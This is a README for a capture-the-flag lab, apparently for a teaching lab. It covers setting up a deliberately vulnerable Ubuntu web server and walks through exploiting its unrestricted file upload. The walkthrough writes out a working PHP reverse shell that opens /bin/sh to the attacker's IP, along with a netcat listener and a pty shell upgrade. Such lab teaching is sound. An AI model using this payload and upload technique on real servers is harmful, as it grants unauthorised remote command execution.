# Reverse Shell CTF
<h1>Vulnerable Machine Setup</h1>

<h2>VM</h2>
Create an Ubuntu Server VM (It could work with any debian I just havent tested)

<h3>Setting up the Server</h3>

When logged in as a user with root permissions, clone this repository:

``` 
git clone https://github.com/NarcoMarco/ai4
```

Once the repository is finished cloning, Use the following commands to build the CTF challenge.

```
cd ai4
sudo chmod u+x setup.sh
sudo ./setup.sh
```

<h1>Setting up the Attack Box</h1>
<h2>VM</h2>
Create a Debian VM. This could be ubuntu, linux mint, kali linux, etc.
<br>
You could also use another Ubuntu Server VM, and choose to do things that require a web browser from the host machine.
<br>
<br>
Run the following commands in the VM.

```
sudo apt install netcat -y
```

<h1>Completing the CTF Challenge</h1>
<h2>Creating the Reverse Shell php File</h2>
Before we create the file, we need to make note of our Attack Box's ip address. In the Attack Box, write the following command.

```
ip a
```

In the output of this command, we need to find the appropriate IP address. The IP address we are looking for in this case will probably start with 10.13.37.xxx.

Next, we must create the file that will be uploaded to the webserver hosted on the target VM. Replace the {unique_identifier} with something that is specific to you. This is so that if multiple people are attempting the challenge simultaneously, it will not stop other people from completing the challenge. This file should be created on whatever system will access a web browser so it can be uploaded to the webserver.

```
nano reverse_shell_{unique_identifier}.php
```

Inside this file, we will add the following, replacing {ip_address} with the ip address that you noted down previously.

```
<?php
$ip = '{ip_address}';
$port = 5555;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

<h2>Preparing for the Reverse Shell</h2>
Before we upload the script to the web server, we need to tell our Attack Box to listen for the connection that the script will trigger.

```
nc -nvlp 5555
```
This command will tell your system to listen for incoming Reverse Shell connections on port 5555. This means that when the file upload triggers the Reverse Shell, it will connect to your computer.

<h2>Uploading the File and Starting the Reverse Shell</h2>
To access the file upload webpage, we will use a web browser and navigate to:

```
http://{server_ip_address}/upload.php
```
Replace {server_ip_address} with the IP address of the vulnerable machine. In the case that you are doing this challenge in the Tech Lab, the ip_address you will use is:

```
10.13.37.243
```

On this website, press the upload button, and select the previously created reverse_shell_{unique_identifier}.php file. Click the button at the end to commit the file to be uploaded.
<br>
<br>
After the file has been uploaded, we need to navigate to the uploaded file using our web browser to trigger the script. To do this, navigate to this web address:

```
http://{server_ip_address}/uploads/reverse_shell_{unique_identifier}.php
```
Again, replace the {server_ip_address} with the IP address of the vulnerable machine, and the {unique_identifier} with the one you chose earlier.

<h2>Using the Reverse Shell</h2>
At this point, you should see a line of text on the Attack Box that says that the connection was successful. You can now execute commands on the Vulnerable Machine.
<br>
<br>
You may notice that you do not have any prompt for the terminal. This can be fixed by using python3 to summon bash, the default shell.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

You will now be able to see that you are in the directory:
```
/var/www/html/uploads
```

There is a folder located in the root (/) directory. In this folder, you will find a number of files. The newest file contains the password to a python file in /var/www/html. 

```
Hint: The ls command has the options -t for time (newest first), and -r for reverse.
```

Once you have the correct password, run the python file in /var/www/html/uploads, and when it prompts you for the password, input the password that you found. If the password is correct, it will give you the flag.
